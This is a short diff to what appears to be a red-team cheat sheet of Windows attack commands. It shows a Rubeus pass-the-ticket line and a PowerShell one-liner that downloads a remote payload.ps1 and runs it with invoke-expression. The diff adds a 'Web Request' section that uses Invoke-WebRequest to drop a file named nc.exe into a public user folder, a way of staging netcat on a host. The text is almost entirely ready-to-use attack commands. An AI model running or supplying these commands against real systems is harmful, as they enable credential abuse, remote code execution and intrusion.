@@ -75,3 +75,8 @@ Rubeus ptt /ticket:[...snip...]
 ```
 cmd.exe /c powershell -c '$c=new-objectsystem.net.WebClient;$x=$c.downloadstring('http://x192.168.1.1/payload.ps1');invoke-expression $x'
 ```
+
+### Web Request
+```
+powershell Invoke-WebRequest -o C:\Users\Public\nc.exe https://google.com/robots.txt
+```
